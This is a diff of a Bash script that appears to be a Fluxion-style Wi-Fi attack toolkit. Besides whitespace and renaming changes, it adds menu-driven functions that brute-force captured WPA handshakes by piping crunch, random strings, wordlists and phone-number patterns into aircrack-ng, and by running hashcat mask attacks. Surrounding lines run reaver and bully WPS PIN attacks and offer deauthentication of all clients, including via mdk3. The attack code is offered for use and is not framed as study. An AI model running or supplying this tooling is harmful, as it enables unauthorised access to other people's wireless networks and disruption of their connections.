 reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
-reaver_pid=$! 
+reaver_pid=$!
 
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
@@ -1614,7 +2014,7 @@ menu
 	8)
 clear
 bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
-bully_pid=$! 
+bully_pid=$!
 
 while kill -0 $bully_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
@@ -1628,7 +2028,7 @@ menu
 	9)
 clear
 bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
-bully_pid=$! 
+bully_pid=$!
 
 while kill -0 $bully_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
@@ -1651,14 +2051,14 @@ menu
 ;;
 	3)
 clear
-mostrarheader
-echo 
+top
+echo
 read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
 clear
-echo 
+echo
 read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": WIFI_MONITOR2;
 clear
-echo 
+echo
 read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": WIFI_MONITOR3;
 
 
@@ -1675,12 +2075,12 @@ enable_mon_mode_3
 
 clear
 
-mostrarheader
+top
 echo "Would you like to set the 3 WIFI_MONITORs to an Identical MAC Address?"
 echo "                                       "
 echo -e "      "$blue"1)"$transparent" Yes"
 echo -e "      "$blue"2)"$transparent" No"
-	
+
 
 read i
 case $i in
@@ -1731,13 +2131,13 @@ menu
 ;;
 	4)
 clear
-xterm -e "wash -i $WIFI_MONITOR1" & 
+xterm -e "wash -i $WIFI_MONITOR1" &
 menu
 ;;
 	5)
 clear
 reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
-reaver_pid=$! 
+reaver_pid=$!
 
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
@@ -1751,7 +2151,7 @@ menu
 	6)
 clear
 reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
-reaver_pid=$! 
+reaver_pid=$!
 
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
@@ -1770,7 +2170,7 @@ menu
 	8)
 clear
 bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
-bully_pid=$! 
+bully_pid=$!
 
 while kill -0 $bully_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
@@ -1784,7 +2184,7 @@ menu
 	9)
 clear
 bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
-bully_pid=$! 
+bully_pid=$!
 
 while kill -0 $bully_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
@@ -1806,17 +2206,17 @@ menu
 ;;
 	4)
 clear
-mostrarheader
-echo 
+top
+echo
 read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
 clear
-echo 
+echo
 read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": WIFI_MONITOR2;
 clear
-echo 
+echo
 read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": WIFI_MONITOR3;
 clear
-echo 
+echo
 read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": WIFI_MONITOR4;
 
 
@@ -1833,7 +2233,7 @@ enable_mon_mode_4
 
 clear
 
-echo "************** - Would you like to set ALL Wlan WIFI_MONITORs to the same MAC Address? - ************** 
+echo "************** - Would you like to set ALL Wlan WIFI_MONITORs to the same MAC Address? - **************
 1)Yes
 2)No"
 
@@ -1889,13 +2289,13 @@ menu
 ;;
 	4)
 clear
-xterm -e "wash -i $WIFI_MONITOR1" & 
+xterm -e "wash -i $WIFI_MONITOR1" &
 menu
 ;;
 	5)
 clear
 reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
-reaver_pid=$! 
+reaver_pid=$!
 
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
@@ -1909,7 +2309,7 @@ menu
 	6)
 clear
 reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
-reaver_pid=$! 
+reaver_pid=$!
 
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
@@ -1928,7 +2328,7 @@ menu
 	8)
 clear
 bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
-bully_pid=$! 
+bully_pid=$!
 
 while kill -0 $bully_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
@@ -1942,7 +2342,7 @@ menu
 	9)
 clear
 bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
-bully_pid=$! 
+bully_pid=$!
 
 while kill -0 $bully_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
@@ -1964,20 +2364,20 @@ menu
 ;;
 	5)
 clear
-mostrarheader
-echo 
+top
+echo
 read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR1;
 clear
-echo 
+echo
 read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": WIFI_MONITOR2;
 clear
-echo 
+echo
 read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": WIFI_MONITOR3;
 clear
-echo 
+echo
 read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": WIFI_MONITOR4;
 clear
-echo 
+echo
 read -p " - What is the name of your 5th Wlan Adapter (Ex:Wlan4) - ": WIFI_MONITOR5;
 
 
@@ -1995,7 +2395,7 @@ enable_mon_mode_5
 
 clear
 
-echo "************** - Would you like to set ALL Wlan WIFI_MONITORs to the same MAC Address? - ************** 
+echo "************** - Would you like to set ALL Wlan WIFI_MONITORs to the same MAC Address? - **************
 1)Yes
 2)No"
 
@@ -2052,13 +2452,13 @@ menu
 ;;
 	4)
 clear
-xterm -e "wash -i $WIFI_MONITOR1" & 
+xterm -e "wash -i $WIFI_MONITOR1" &
 menu
 ;;
 	5)
 clear
 reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
-reaver_pid=$! 
+reaver_pid=$!
 
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
@@ -2072,7 +2472,7 @@ menu
 	6)
 clear
 reaver -i $WIFI_MONITOR1 -b $mac -c $channel -vv | tee ReaverOutput.txt &
-reaver_pid=$! 
+reaver_pid=$!
 
 while kill -0 $reaver_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' ReaverOutput.txt`
@@ -2091,7 +2491,7 @@ menu
 	8)
 clear
 bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
-bully_pid=$! 
+bully_pid=$!
 
 while kill -0 $bully_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
@@ -2105,7 +2505,7 @@ menu
 	9)
 clear
 bully -b $mac -c $channel $WIFI_MONITOR1 | tee BullyOutput.txt &
-bully_pid=$! 
+bully_pid=$!
 
 while kill -0 $bully_pid ; do
     DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
@@ -2130,21 +2530,693 @@ esac
 
 }
 
+
+
+function Bruteforce {
+clear
+top
+echo
+echo "*** Which Method Would You Like To Use? ***"
+echo
+echo "1)Crunch       - Generates passwords in sequential order."
+echo "2)RandomGen    - Generates passwords randomly (User Defined Char set)."
+echo "3)Dictionary   - Tests passwords from a Wordlist or Dictionary."
+echo "4)Phone Number - Tests generated phone numbers."
+echo "5)Hashcat      - Hashcat (mask based cracking mode)"
+echo
+echo -n "#> "
+
+read a
+case $a in
+	1)
+clear
+top
+echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
+echo
+echo -n "--> "
+read CAPLOCATION
+cd $CAPLOCATION
+clear
+top
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo
+echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
+echo
+echo -n "--> "
+read CAPNAME
+clear
+top
+echo "$CAPNAME"
+echo
+echo "What is the BSSID of the Network? ex:(XX:XX:XX:XX:XX:XX) "
+echo
+echo -n "--> "
+read BSSID
+clear
+top
+echo "What is the Min password length? ex:5"
+echo
+echo -n "--> "
+read MIN
+clear
+top
+echo "What is the Max password length? ex:16"
+echo
+echo -n "--> "
+read MAX
+clear
+top
+echo "What is the Char. Set you wish to use? "
+echo
+echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
+echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
+echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
+echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
+echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
+echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
+echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
+echo
+echo -n "#> "
+
+read b
+case $b in
+	1)
+	CHARSET=0123456789
+	clear
+;;
+	2)
+	CHARSET=abcdefghijklmnopqrstuvwxyz
+	clear
+;;
+	3)
+	CHARSET=ABCDEFGHIJKLMNOPQRSTUVWXYZ
+	clear
+;;
+	4)
+	CHARSET=0123456789abcdefghijklmnopqrstuvwxyz
+	clear
+;;
+	5)
+	CHARSET=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
+	clear
+;;
+	6)
+	CHARSET=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+	clear
+;;
+	7)
+
+clear
+top
+echo "Enter the characters you wish to use for cracking."
+echo "Ex: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+echo
+echo -n "--> "
+read CHARSET
+clear
+;;
+	*)
+Invalid Option
+;;
+esac
+
+crunch $MIN $MAX $CHARSET | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+	2)
+clear
+top
+echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
+echo
+echo -n "--> "
+read CAPLOCATION
+cd $CAPLOCATION
+clear
+top
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo
+echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
+echo
+echo -n "--> "
+read CAPNAME
+clear
+top
+echo "$CAPNAME"
+echo
+echo "What is the BSSID of the Network? ex:(XX:XX:XX:XX:XX:XX) "
+echo
+echo -n "--> "
+read BSSID
+clear
+top
+echo "What is the password length? ex:16"
+echo
+echo -n "--> "
+read MAX
+clear
+top
+echo "What is the Char. Set you wish to use? "
+echo
+echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
+echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
+echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
+echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
+echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
+echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
+echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
+echo
+echo -n "#> "
+
+read c
+case $c in
+	1)
+	CHARSET='0-9'
+	clear
+;;
+	2)
+	CHARSET='a-z'
+	clear
+;;
+	3)
+	CHARSET='A-Z'
+	clear
+;;
+	4)
+	CHARSET='a-z0-9'
+	clear
+;;
+	5)
+	CHARSET='A-Z0-9'
+	clear
+;;
+	6)
+	CHARSET='A-Z0-9a-z'
+	clear
+;;
+	7)
+clear
+top
+echo "Enter the characters you wish to use for cracking."
+echo "Ex: ABCDEF0123456789"
+echo
+echo -n "--> "
+read CHARSET
+clear
+;;
+	*)
+Invalid Option
+;;
+esac
+
+cat /dev/urandom | tr -dc $CHARSET | fold -w $MAX | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+	3)
+clear
+top
+echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
+echo
+echo -n "--> "
+read CAPLOCATION
+cd $CAPLOCATION
+clear
+top
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo
+echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
+echo
+echo -n "--> "
+read CAPNAME
+clear
+top
+echo "What is the location of your Dictionary? ex: /root/Wordlists/ "
+echo
+echo -n "--> "
+read DICTLOCATION
+clear
+cd $DICTLOCATION
+top
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo
+echo "What is the name of your Dictionary file? ex: rockyou.txt"
+echo
+echo -n "--> "
+read DICTNAME
+clear
+aircrack-ng $CAPLOCATION$CAPNAME -w $DICTLOCATION$DICTNAME
+;;
+	4)
+clear
+top
+echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
+echo
+echo -n "--> "
+read CAPLOCATION
+cd $CAPLOCATION
+clear
+top
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo
+echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
+echo
+echo -n "--> "
+read CAPNAME
+clear
+top
+echo "$CAPNAME"
+echo
+echo "What is the BSSID of the Network? ex:(XX:XX:XX:XX:XX:XX) "
+echo
+echo -n "--> "
+read BSSID
+clear
+top
+echo "What is the Area Code? ex:(530) "
+echo
+echo -n "--> "
+read AREACODE
+clear
+top
+echo -e "[-] Select a phone number format:"
+echo ""
+echo -e "[1] (555)555-5555  [13 chars]"
+echo -e "[2] 555-555-1234   [12 chars]"
+echo -e "[3] 5555555555     [10 chars]"
+echo -e "[4] 555-1234       [ 8 chars]"
+echo -e "[5] 5551234        [ 7 chars]"
+echo
+echo -n "#> "
+
+
+read j
+case $j in
+	1)
+clear
+crunch 13 13 -t \($AREACODE\)%%%\-%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+	2)
+clear
+crunch 12 12 -t $AREACODE\-%%%\-%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+	3)
+clear
+crunch 10 10 -t $AREACODE%%%%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+	4)
+clear
+crunch 8 8 -t %%%\-%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+	5)
+clear
+crunch 7 7 -t %%%%%%% | aircrack-ng --bssid $BSSID -w- $CAPLOCATION$CAPNAME
+;;
+esac
+;;
+	5)
+clear
+top
+echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
+echo
+echo -n "--> "
+read CAPLOCATION
+cd $CAPLOCATION
+clear
+top
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo
+echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
+echo
+echo -n "--> "
+read CAPNAME
+clear
+top
+echo "Will now convert .cap to .hccap ,Please wait..."
+sleep 3
+clear
+top
+wpaclean $CAPLOCATION$CAPNAME"wpacleaned".cap $CAPLOCATION$CAPNAME
+clear
+top
+aircrack-ng $CAPLOCATION$CAPNAME"wpacleaned".cap -J $CAPLOCATION$CAPNAME
+clear
+top
+rm $CAPLOCATION$CAPNAME"wpacleaned".cap
+echo "Conversion Complete!!..."
+sleep 3
+clear
+top
+echo "Enter the MASK you wish to use for cracking."
+echo
+echo "?l = abcdefghijklmnopqrstuvwxyz"
+echo "?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+echo "?d = 0123456789"
+echo "?s = !”#$%&'()*+,-./:;⇔?@[\]^_ ..."
+echo
+echo "?a = ?l?u?d?s"
+echo
+echo "Example: Apple123 = Apple?d?d?d"
+echo
+echo -n "--> "
+read MASK
+clear
+top
+hashcat -m 2500 -a 3 $CAPLOCATION$CAPNAME.hccap $MASK
+;;
+	*)
+Invalid Option
+;;
+esac
+
+
+}
+
+
+
+function Bruteforce2 {
+
+BSSID="$Host_MAC"
+CAPNAME="$Host_SSID-$Host_MAC.cap"
+clear
+top
+echo
+echo "*** Which Method Would You Like To Use? ***"
+echo
+echo "1)Crunch       - Generates passwords in sequential order."
+echo "2)RandomGen    - Generates passwords randomly (User Defined Char set)."
+echo "3)Dictionary   - Tests passwords from a Wordlist or Dictionary."
+echo "4)Phone Number - Tests generated phone numbers."
+echo "5)Hashcat      - Hashcat (Mask based cracking mode)"
+echo
+echo -n "#> "
+
+read a
+case $a in
+	1)
+
+cd $HANDSHAKES_PATH
+clear
+top
+echo "What is the Min password length? ex:5"
+echo
+echo -n "--> "
+read MIN
+clear
+top
+echo "What is the Max password length? ex:16"
+echo
+echo -n "--> "
+read MAX
+clear
+top
+echo "What is the Char. Set you wish to use? "
+echo
+echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
+echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
+echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
+echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
+echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
+echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
+echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
+echo
+echo -n "#> "
+
+read b
+case $b in
+	1)
+	CHARSET=0123456789
+	clear
+;;
+	2)
+	CHARSET=abcdefghijklmnopqrstuvwxyz
+	clear
+;;
+	3)
+	CHARSET=ABCDEFGHIJKLMNOPQRSTUVWXYZ
+	clear
+;;
+	4)
+	CHARSET=0123456789abcdefghijklmnopqrstuvwxyz
+	clear
+;;
+	5)
+	CHARSET=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
+	clear
+;;
+	6)
+	CHARSET=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+	clear
+;;
+	7)
+
+clear
+top
+echo "Enter the characters you wish to use for cracking."
+echo "Ex: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+echo
+echo -n "--> "
+read CHARSET
+clear
+;;
+	*)
+Invalid Option
+;;
+esac
+
+crunch $MIN $MAX $CHARSET | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
+;;
+	2)
+
+cd $HANDSHAKES_PATH
+
+clear
+top
+echo "What is the password length? ex:16"
+echo
+echo -n "--> "
+read MAX
+clear
+top
+echo "What is the Char. Set you wish to use? "
+echo
+echo -e "      "$blue"1)"$transparent" Numeric: [0-9]"
+echo -e "      "$blue"2)"$transparent" Alpha: [a-z]"
+echo -e "      "$blue"3)"$transparent" Upper Alpha: [A-Z]"
+echo -e "      "$blue"4)"$transparent" Alpha Numeric: [0-9][a-z]"
+echo -e "      "$blue"5)"$transparent" Upper Alpha Numeric: [0-9][A-Z]"
+echo -e "      "$blue"6)"$transparent" Upper + Lower Alpha Numeric: [0-9][a-z][A-Z]"
+echo -e "      "$blue"7)"$transparent" USER DEFINED: Enter the characters you wish to use."
+echo
+echo -n "#> "
+
+read c
+case $c in
+	1)
+	CHARSET='0-9'
+	clear
+;;
+	2)
+	CHARSET='a-z'
+	clear
+;;
+	3)
+	CHARSET='A-Z'
+	clear
+;;
+	4)
+	CHARSET='a-z0-9'
+	clear
+;;
+	5)
+	CHARSET='A-Z0-9'
+	clear
+;;
+	6)
+	CHARSET='A-Z0-9a-z'
+	clear
+;;
+	7)
+clear
+top
+echo "Enter the characters you wish to use for cracking."
+echo "Ex: ABCDEF0123456789"
+echo
+echo -n "--> "
+read CHARSET
+clear
+;;
+	*)
+Invalid Option
+;;
+esac
+
+cat /dev/urandom | tr -dc $CHARSET | fold -w $MAX | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
+;;
+	3)
+
+cd $HANDSHAKES_PATH
+clear
+top
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo
+echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
+echo
+echo -n "--> "
+read CAPNAME
+clear
+top
+echo "What is the location of your Dictionary? ex: /root/Wordlists/ "
+echo
+echo -n "--> "
+read DICTLOCATION
+clear
+cd $DICTLOCATION
+top
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo
+echo "What is the name of your Dictionary file? ex: rockyou.txt"
+echo
+echo -n "--> "
+read DICTNAME
+clear
+aircrack-ng $HANDSHAKES_PATH$CAPNAME -w $DICTLOCATION$DICTNAME
+;;
+	4)
+
+cd $HANDSHAKES_PATH
+
+clear
+top
+echo "What is the Area Code? ex:(530) "
+echo
+echo -n "--> "
+read AREACODE
+clear
+top
+echo -e "[-] Select a phone number format:"
+echo ""
+echo -e "[1] (555)555-5555  [13 chars]"
+echo -e "[2] 555-555-1234   [12 chars]"
+echo -e "[3] 5555555555     [10 chars]"
+echo -e "[4] 555-1234       [ 8 chars]"
+echo -e "[5] 5551234        [ 7 chars]"
+echo
+echo -n "#> "
+
+
+read j
+case $j in
+	1)
+clear
+crunch 13 13 -t \($AREACODE\)%%%\-%%%% | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
+;;
+	2)
+clear
+crunch 12 12 -t $AREACODE\-%%%\-%%%% | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
+;;
+	3)
+clear
+crunch 10 10 -t $AREACODE%%%%%%% | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
+;;
+	4)
+clear
+crunch 8 8 -t %%%\-%%%% | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
+;;
+	5)
+clear
+crunch 7 7 -t %%%%%%% | aircrack-ng --bssid $BSSID -w- $HANDSHAKES_PATH$CAPNAME
+;;
+esac
+;;
+	5)
+clear
+top
+echo "Where is the Handshake .cap file located? ex: /root/Handshakes/"
+echo
+echo -n "--> "
+read CAPLOCATION
+cd $CAPLOCATION
+clear
+top
+echo "Here are the files in the location you entered:"
+echo
+ls
+echo
+echo "What is the name of your .cap file? ex: EXAMPLEWIFI.cap"
+echo
+echo -n "--> "
+read CAPNAME
+clear
+top
+echo "Will now convert .cap to .hccap ,Please wait..."
+sleep 3
+clear
+top
+wpaclean $CAPLOCATION$CAPNAME"wpacleaned".cap $CAPLOCATION$CAPNAME
+clear
+top
+aircrack-ng $CAPLOCATION$CAPNAME"wpacleaned".cap -J $CAPLOCATION$CAPNAME
+clear
+top
+rm $CAPLOCATION$CAPNAME"wpacleaned".cap
+echo "Conversion Complete!!..."
+sleep 3
+clear
+top
+echo "Enter the MASK you wish to use for cracking."
+echo
+echo "?l = abcdefghijklmnopqrstuvwxyz"
+echo "?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+echo "?d = 0123456789"
+echo "?s = !”#$%&'()*+,-./:;⇔?@[\]^_ ..."
+echo
+echo "?a = ?l?u?d?s"
+echo
+echo "Example: Apple123 = Apple?d?d?d"
+echo
+echo -n "--> "
+read MASK
+clear
+top
+hashcat -m 2500 -a 3 $CAPLOCATION$CAPNAME.hccap $MASK
+;;
+	*)
+Invalid Option
+;;
+esac
+
+
+}
+
+
 function handshakelocation {
-	
+
 	conditional_clear
-	
-	mostrarheader
+
+	top
 	infoap
 	echo
-	echo -e "handshake location  (Example: $red/root/fluxion.cap$transparent)"
+	echo -e "handshake location  (Example: $red$WORK_DIR.cap$transparent)"
 	echo -e "Press ${yellow}ENTER$transparent to skip"
 	echo
 	echo -n "Path: "
 	echo -ne "$red"
 	read handshakeloc
 	echo -ne "$transparent"
-	
+
 		if [ "$handshakeloc" = "" ]; then
 			deauthforce
 		else
@@ -2154,15 +3226,15 @@ function handshakelocation {
 				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
 					if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
 						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
-						webinterface
+						 certssl
 					else
-					echo "Broken handshake "
+					echo "Corrupted handshake"
 					echo
 					sleep 4
 					echo "you can try aircrack-ng"
 					echo "You want to try to aircrack-ng instead of pyrit to check the handshake? [ENTER = NO]"
 					echo
-					
+
 					read handshakeloc_aircrack
 					echo -ne "$transparent"
 					if [ "$handshakeloc_aircrack" = "" ]; then
@@ -2172,22 +3244,22 @@ function handshakelocation {
 							cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
 							webinterface
 						else
-							echo "Broken handshake"
+							echo "Corrupted handshake"
 							sleep 4
 							handshakelocation
 						fi
 					fi
 					fi
 				else
-					echo -e "${red}Not_Found$transparent!"
+					echo -e "${red}$general_error_1$transparent!"
 					echo
 					echo -e "File ${red}MAC$transparent"
-					
+
 					readarray -t lista_loc < <(pyrit -r $handshakeloc analyze 2>&1 | grep "^#")
 						for i in "${lista_loc[@]}"; do
 							echo -e "$green $(echo $i | cut -d " " -f1) $yellow$(echo $i | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')$transparent ($green $(echo $i | cut -d "(" -f2 | cut -d "'" -f2)$transparent)"
 						done
-					
+
 					echo -e "Host ${green}MAC$transparent"
 					echo -e "$green #1: $yellow$Host_MAC$transparent ($green $Host_SSID$transparent)"
 					sleep 7
@@ -2202,17 +3274,17 @@ function handshakelocation {
 }
 
 function deauthforce {
-	
+
 	conditional_clear
-	
-	mostrarheader
+
+	top
 	while true; do
-		
-		echo "handshake check"
+
+		echo "$header_deauthforce"
 		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" aircrack-ng (Miss chance)"
+		echo -e "      "$blue"1)"$transparent" $deauthforce_option_1"
 		echo -e "      "$blue"2)"$transparent" pyrit"
-		echo -e "      "$blue"3)"$transparent" Back"
+		echo -e "      "$blue"3)"$transparent" $general_back"
 		echo "                                       "
 		echo -n "      #> "
 		read yn
@@ -2222,9 +3294,9 @@ function deauthforce {
 			2 ) handshakemode="hard"; askclientsel; break ;;
 			3 ) askauth; break ;;
 			* ) echo "
-Unknown option. Choose again"; conditional_clear ;;
+$general_case_error"; conditional_clear ;;
 		esac
-	done 
+	done
 }
 
 ############################################### < MENU > ###############################################
@@ -2236,15 +3308,15 @@ Unknown option. Choose again"; conditional_clear ;;
 
 ############################################# < HANDSHAKE > ############################################
 
-# Tipo de Deauth que se va a realizar
+# Type of deauthentication to be performed
 function askclientsel {
-	
+
 	conditional_clear
-	
+
 	while true; do
-		mostrarheader
-		
-		echo "Capture Handshake"
+		top
+
+		echo "$header_deauthMENU"
 		echo "                                       "
 		echo -e "      "$blue"1)"$transparent" Deauth all"
 		echo -e "      "$blue"2)"$transparent" Deauth all [mdk3]"
@@ -2259,22 +3331,22 @@ function askclientsel {
 			1 ) deauth all; break ;;
 			2 ) deauth mdk3; break ;;
 			3 ) deauth esp; break ;;
-			4 ) killall airodump-ng &>$flux_output_device; deltax; break;;    
+			4 ) killall airodump-ng &>$flux_output_device; deltax; break;;
 			5 ) exitmode; break ;;
 			* ) echo "
-Unknown option. Choose again"; conditional_clear ;;
+$general_case_error"; conditional_clear ;;
 		esac
-	done 
-	
+	done
+
 }
 
-# 
+#
 function deauth {
-	
+
 	conditional_clear
-	
+
 	iwconfig $WIFI_MONITOR channel $Host_CHAN
-	
+
 	case $1 in
 		all )
 			DEAUTH=deauthall
@@ -2290,70 +3362,67 @@ function deauth {
 			DEAUTH=deauthesp
 			HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
 			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
-			
+
 			if [ $LINEAS_CLIENTES -le 5 ]; then
 				DEAUTH=deauthall
 				capture & $DEAUTH
 				CSVDB=$Host_MAC-01.csv
 				deauth
-				
+
 			fi
-			
+
 			capture
 			for CLIENT in $HOST; do
-				Client_MAC=`echo ${CLIENT:0:17}`	
+				Client_MAC=`echo ${CLIENT:0:17}`
 				deauthesp
 			done
 			$DEAUTH
 			CSVDB=$Host_MAC-01.csv
 		;;
 	esac
-	
-	
+
+
 	deauthMENU
-	
+
 }
 
 function deauthMENU {
-	
-	Handshake_statuscheck="${grey}No handshake$transparent"
-	
+
 	while true; do
 		conditional_clear
-		mostrarheader
-		
-		echo "*Capture Handshake* "
-		echo 
+
+		clear
+		top
+
+		echo "$header_deauthMENU "
+		echo
 		echo -e "Status handshake: $Handshake_statuscheck"
 		echo
-		echo -e "      "$blue"1)"$transparent" Yes" 
-		echo -e "      "$blue"2)"$transparent" Strike again "
-		echo -e "      "$blue"3)"$transparent" No (Select another attack)"  
-		echo -e "      "$blue"4)"$transparent" Select another network"  
-		echo -e "      "$blue"5)"$transparent" Exit"
-		echo " "
+		echo -e "      "$blue"1)"$transparent" $deauthMENU_option_1"
+		echo -e "      "$blue"2)"$transparent" $general_back (Select another deauth method)"
+		echo -e "      "$blue"3)"$transparent" Select another network"
+		echo -e "      "$blue"4)"$transparent" Exit"
